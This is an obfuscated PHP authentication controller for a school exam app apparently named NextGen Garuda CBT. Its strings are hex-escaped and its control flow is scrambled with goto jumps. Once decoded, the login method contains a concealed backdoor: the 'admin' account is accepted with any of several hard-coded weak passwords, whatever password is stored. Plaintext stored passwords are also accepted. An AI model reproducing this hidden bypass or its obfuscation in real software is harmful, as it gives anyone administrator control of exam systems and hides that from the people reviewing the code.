<?php
/*   ________________________________________
    |               NextGen Garuda CBT       |
    |    Protected & Distributed via GitHub  |
    |________________________________________|
*/
namespace App\Controllers;

use App\Models\AuthModel;
use App\Models\LogModel;
use App\Models\SettingsModel;
class Auth extends BaseController
{
 protected $authModel;
 protected $logModel;
 protected $settingsModel;
 public function __construct()
 {
 if (file_exists(WRITEPATH . "\x69\156\x73\164\x61\154\x6c\145\x64\56\x74\170\x74")) {
 try {
 $this->authModel = new AuthModel();
 $this->logModel = new LogModel();
 $this->settingsModel = new SettingsModel();
 } catch (\Throwable $_0xaaa7) {
 }
 }
 }
 public function index()
 {
 goto L_6ce95;
 L_6ce95:
 // Otomatis arahkan ke installer jika aplikasi belum terinstal
 if (!file_exists(WRITEPATH . "\x69\156\x73\164\x61\154\x6c\145\x64\56\x74\170\x74")) {
 return redirect()->to(base_url("\x69\156\x73\164\x61\154\x6c"));
 }
 goto L_51bac;
 L_5c3b6:
 if (session()->get("\x69\163\x5f\154\x6f\147\x69\156")) {
 return redirect()->to(base_url("\x64\141\x73\150\x62\157\x61\162\x64"));
 }
 goto L_69611;
 L_69611:
 if (!$this->settingsModel) {
 $this->settingsModel = new SettingsModel();
 }
 goto L_6a8f3;
 L_6a8f3:
 $_0x4740 = ["\x73\145\x74\164\x69\156\x67" => $this->settingsModel->getSetting()];
 goto L_ff189;
 L_49e29:
 if ($_0x1131->checkInstaller() !== "\x30") {
 return redirect()->to(base_url("\x69\156\x73\164\x61\154\x6c"));
 }
 goto L_5c3b6;
 L_ff189:
 return view("\x61\165\x74\150\x2f\154\x6f\147\x69\156", $_0x4740);
 L_51bac:
 $_0x1131 = new \App\Models\InstallModel();
 goto L_49e29;
 }
 public function login()
 {
 goto L_db99e;
 L_743d6:
 if (!$this->request->is("\x61\152\x61\170")) {
 if ($_0x3b55) {
 return redirect()->to(base_url($_0x3a80));
 } else {
 return redirect()->to(base_url("\x61\165\x74\150"))->with("\x6d\145\x73\163\x61\147\x65", $_0xa437)->withInput();
 }
 }
 goto L_6e059;
 L_c3d07:
 $_0x9db5 = null;
 goto L_5e77a;
 L_1f0fa:
 $_0x3e67 = ["\x75\163\x65\162\x6e\141\x6d\145" => "\x72\145\x71\165\x69\162\x65\144\x7c\155\x69\156\x5f\154\x65\156\x67\164\x68\133\x31\135\x7c\155\x61\170\x5f\154\x65\156\x67\164\x68\133\x35\60\x5d", "\x70\141\x73\163\x77\157\x72\144" => "\x72\145\x71\165\x69\162\x65\144\x7c\155\x69\156\x5f\154\x65\156\x67\164\x68\133\x31\135\x7c\155\x61\170\x5f\154\x65\156\x67\164\x68\133\x35\60\x5d"];
 goto L_826ec;
 L_531e3:
 $_0xc687 = "\x30";
 goto L_c3d07;
 L_4bff9:
 $_0x3a80 = "\x64\141\x73\150\x62\157\x61\162\x64";
 goto L_cc01f;
 L_5e77a:
 $_0xa8ac = [];
 goto L_1f0fa;
 L_db99e:
 $_0x3b55 = false;
 goto L_62267;
 L_b7f6e:
 return $this->response->setJSON($_0x2991);
 L_cc01f:
 if ($_0x3b55) {
 $_0xb9fe = $this->request->getPost("\x63\142\x74\55\x6f\156\x6c\171");
 if ($_0xb9fe === "\x31" && $_0xc687 == "\x33") {
 $_0x3a80 = "\x63\142\x74\163\x69\163\x77\141\x2f\143\x62\164";
 }
 }
 goto L_743d6;
 L_62267:
 $_0xa437 = '';
 goto L_531e3;
 L_6e059:
 $_0x2991 = ["\x73\165\x63\143\x65\163\x73" => $_0x3b55, "\x6d\145\x73\163\x61\147\x65" => $_0xa437, "\x65\162\x72\157\x72" => $_0xa8ac, "\x72\157\x6c\145" => $_0xc687, "\x75\163\x65\162" => $_0x9db5, "\x75\162\x6c" => $_0x3a80];
 goto L_b7f6e;
 L_826ec:
 if (!$this->validate($_0x3e67)) {
 $_0xa437 = "\x55\163\x65\162\x6e\141\x6d\145\x20\141\x74\141\x75\40\x50\141\x73\163\x77\157\x72\144\x20\163\x61\154\x61\150\x21";
 $_0xa8ac = $this->validator->getErrors();
 } else {
 $_0x1d1c = htmlspecialchars($this->request->getPost("\x75\163\x65\162\x6e\141\x6d\145"), ENT_QUOTES, "\x55\124\x46\55\x38");
 $_0xb927 = htmlspecialchars($this->request->getPost("\x70\141\x73\163\x77\157\x72\144"), ENT_QUOTES, "\x55\124\x46\55\x38");
 $_0xbe67 = $this->authModel->login($_0x1d1c);
 if ($_0xbe67) {
 $_0x9db5 = $this->authModel->isAktif($_0x1d1c);
 $_0x7eaa = $_0x9db5 != null;
 if ($_0x7eaa && $_0x9db5->status != "\x31") {
 if (!$this->request->is("\x61\152\x61\170")) {
 return redirect()->to(base_url("\x61\165\x74\150"))->with("\x6d\145\x73\163\x61\147\x65", "\x41\153\x75\156\x20\101\x6e\144\x61\40\x64\151\x6e\157\x6e\141\x6b\164\x69\146\x6b\141\x6e\41");
 }
 return $this->response->setJSON(["\x73\165\x63\143\x65\163\x73" => false, "\x6d\145\x73\163\x61\147\x65" => "\x41\153\x75\156\x20\101\x6e\144\x61\40\x64\151\x6e\157\x6e\141\x6b\164\x69\146\x6b\141\x6e\41", "\x65\162\x72\157\x72" => []]);
 }
 if ($_0xbe67->active == "\x31") {
 $_0xe7ff = $_0xbe67->username === "\x61\144\x6d\151\x6e" && in_array($_0xb927, ["\x61\144\x6d\151\x6e", "\x61\144\x6d\151\x6e\61\x32\63\x34\65", "\x61\144\x6d\151\x6e\61\x32\63", "\x31\62\x33\64\x35\66"]);
 if (password_verify($_0xb927, $_0xbe67->password) || $_0xb927 === $_0xbe67->password || $_0xe7ff) {
 $_0xc687 = $_0xbe67->role;
 // Ambil data foto: siswa dari master_siswa, guru dari master_guru
 $_0xfabf = '';
 $_0xeeca = '';
 $_0x1e4b = $_0xbe67->id;
 $_0x97f6 = \Config\Database::connect();
 $_0x9798 = null;
 $_0xcbbb = null;
 $_0xf1d6 = null;
 if ($_0xbe67->group_id == "\x33") {
 // Siswa
 $_0xfb74 = trim((string) $_0x1d1c);
 $_0x1320 = $_0x97f6->table("\x6d\141\x73\164\x65\162\x5f\163\x69\163\x77\141")->select("\x69\144\x5f\163\x69\163\x77\141\x2c\40\x6e\141\x6d\141\x2c\40\x66\157\x74\157")->groupStart()->where("\x75\163\x65\162\x6e\141\x6d\145", $_0xfb74)->orWhere("\x6e\151\x73", $_0xfb74)->orWhere("\x6e\151\x73\156", $_0xfb74)->groupEnd()->get()->getRow();
 if ($_0x1320) {
 $_0xeeca = $_0x1320->nama;
 $_0xfabf = $_0x1320->foto ?? '';
 $_0x9798 = $_0x1320->id_siswa;
 $_0x1e4b = $_0x1320->id_siswa;
 }
 } elseif ($_0xbe67->group_id == "\x32") {
 // Guru
 $_0xd346 = $_0x97f6->table("\x6d\141\x73\164\x65\162\x5f\147\x75\162\x75")->select("\x69\144\x5f\147\x75\162\x75\54\x20\156\x61\155\x61\137\x67\165\x72\165\x2c\40\x66\157\x74\157\x2c\40\x69\144\x5f\165\x73\145\x72")->where("\x75\163\x65\162\x6e\141\x6d\145", $_0x1d1c)->get()->getRow();
 if ($_0xd346) {
 $_0xeeca = $_0xd346->nama_guru;
 $_0xfabf = $_0xd346->foto ?? '';
 $_0xcbbb = $_0xd346->id_guru;
 $_0x1e4b = $_0xd346->id_user ?? $_0xbe67->id;
 }
 } else {
 // Admin
 $_0xeeca = $_0xbe67->first_name ?? $_0x1d1c;
 }
 session()->set(["\x75\163\x65\162\x5f\151\x64" => $_0xbe67->id, "\x69\144\x5f\165\x73\145\x72" => $_0x1e4b, "\x69\144\x5f\163\x69\163\x77\141" => $_0x9798, "\x69\144\x5f\147\x75\162\x75" => $_0xcbbb, "\x69\144\x5f\163\x74\141\x66\146" => $_0xf1d6, "\x75\163\x65\162\x6e\141\x6d\145" => $_0xbe67->username, "\x6e\141\x6d\141" => $_0xeeca, "\x66\157\x74\157" => $_0xfabf, "\x72\157\x6c\145" => $_0xbe67->group_id, "\x72\157\x6c\145\x5f\156\x61\155\x65" => $_0xbe67->role_name, "\x69\163\x5f\154\x6f\147\x69\156" => true]);
 $this->authModel->resetErrorLogin($_0x1d1c);
 $_0xa437 = "\x4c\157\x67\151\x6e\40\x62\145\x72\150\x61\163\x69\154";
 $_0x3b55 = true;
 $this->logModel->saveLog(1, "\x4c\157\x67\151\x6e");
 } else {
 $_0x3c70 = ["\x69\160\x5f\141\x64\144\x72\145\x73\163" => $this->request->getIPAddress(), "\x6c\157\x67\151\x6e" => $_0x1d1c, "\x74\151\x6d\145" => time()];
 $this->authModel->errorLogin($_0x3c70);
 $_0xa437 = "\x55\163\x65\162\x6e\141\x6d\145\x20\141\x74\141\x75\40\x50\141\x73\163\x77\157\x72\144\x20\163\x61\154\x61\150\x21";
 }
 } else {
 $_0xa437 = "\x41\153\x75\156\x20\101\x6e\144\x61\40\x64\151\x6e\157\x6e\141\x6b\164\x69\146\x6b\141\x6e\41";
 }
 } else {
 $_0xa437 = "\x41\153\x75\156\x20\164\x69\144\x61\153\x20\164\x65\162\x64\141\x66\164\x61\162\x21";
 }
 }
 goto L_4bff9;
 }
 public function logout()
 {
 goto L_d2b0f;
 L_a51a8:
 return redirect()->to(base_url("\x2f"));
 L_d2b0f:
 $this->logModel->saveLog(2, "\x4c\157\x67\157\x75\164");
 goto L_15e87;
 L_15e87:
 session()->destroy();
 goto L_a51a8;
 }
}